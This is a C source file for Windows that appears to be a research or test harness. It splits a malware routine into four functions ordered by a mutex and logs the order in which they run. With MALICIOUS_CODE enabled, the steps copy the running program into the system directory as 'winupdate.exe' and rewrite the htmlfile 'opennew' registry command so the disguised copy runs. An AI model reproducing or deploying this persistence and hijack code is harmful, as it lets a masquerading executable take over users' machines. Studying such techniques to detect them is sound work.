#define WIN32_LEAN_AND_MEAN
#include <stdio.h>
#include <windows.h>
#include <shellapi.h>

#include "BullMoose_4.h"

#ifndef BULLMOOSE_CPP
#define BULLMOOSE_CPP

#define MALICIOUS_CODE 1

static long LOOPS = 190000;

int order = 0;
HANDLE hMutex;
int initMutex()
{
    hMutex = CreateMutex(NULL, FALSE, "mutextName");
    if (hMutex == NULL)
    {
        return 1;
    }
    return 0;
}

static int sequence[100];
int sequenceOrder;
static char OUTPUT_FILENAME[100] = "sequence.log";
static char IF_FILENAME[100] = "statistic.log";
void recordMessage()
{
    int i;
    FILE *fp;
    if ((fp = fopen(IF_FILENAME, "a+")) == NULL)
    {
        printf("can't open the file! \n");
    }
    else
    {
        if (order == 4)
        {
            fprintf(fp, "1\n");
        }
        else
        {
            fprintf(fp, "0\n");
        }
    }
    fclose(fp);

    if ((fp = fopen(OUTPUT_FILENAME, "a+")) == NULL)
    {
        printf("can't open the file! \n");
    }
    else
    {
        for (i = 0; sequence[i] != 0; i++)
        {
            fprintf(fp, "%d, ", sequence[i]);
        }
        fprintf(fp, "\n");
    }
    fclose(fp);
}

void malicious_start()
{

    // OUTPUT_FILENAME = f;
    // LOOPS = atol(argv[4]);
    int i;
    for (i = 0; i < 100; i++)
    {
        sequence[i] = 0;
    }
    sequenceOrder = 0;
    initMutex();
}

void malicious_end()
{
    recordMessage();
}

char MyPath[256];
char CpyPath[256];
HKEY Key32;

void malicious_1()
{
    for (int i = 0; i < LOOPS; i++)
        ;
    WaitForSingleObject(hMutex, INFINITE);
    sequence[sequenceOrder++] = 1;
    if ((1 - order) == 1)
    {
        order = 1;
#if MALICIOUS_CODE
        GetModuleFileName(NULL, MyPath, sizeof(MyPath));
        GetSystemDirectory(CpyPath, sizeof(CpyPath));
#endif
    }
    ReleaseMutex(hMutex);
}

void malicious_2()
{
    for (int i = 0; i < LOOPS; i++)
        ;
    WaitForSingleObject(hMutex, INFINITE);
    sequence[sequenceOrder++] = 2;
    if ((2 - order) == 1)
    {
        order = 2;
#if MALICIOUS_CODE
        strcat(CpyPath, "\\winupdate.exe");
        CopyFile(MyPath, CpyPath, FALSE);
#endif
    }
    ReleaseMutex(hMutex);
}

void malicious_3()
{
    for (int i = 0; i < LOOPS; i++)
        ;
    WaitForSingleObject(hMutex, INFINITE);
    sequence[sequenceOrder++] = 3;
    if ((3 - order) == 1)
    {
        order = 3;
#if MALICIOUS_CODE
        strcat(CpyPath, " %1");
        RegOpenKeyEx(HKEY_CLASSES_ROOT, "htmlfile\\shell\\opennew\\command", 0, KEY_WRITE, &Key32);
#endif
    }
    ReleaseMutex(hMutex);
}

void malicious_4()
{
    for (int i = 0; i < LOOPS; i++)
        ;
    WaitForSingleObject(hMutex, INFINITE);
    sequence[sequenceOrder++] = 4;
    if ((4 - order) == 1)
    {
        order = 4;
#if MALICIOUS_CODE
        RegSetValueEx(Key32, "", 0, REG_SZ, CpyPath, strlen(CpyPath));
        RegCloseKey(Key32);
#endif
    }
    ReleaseMutex(hMutex);
}

#endif // BULLMOOSE_CPP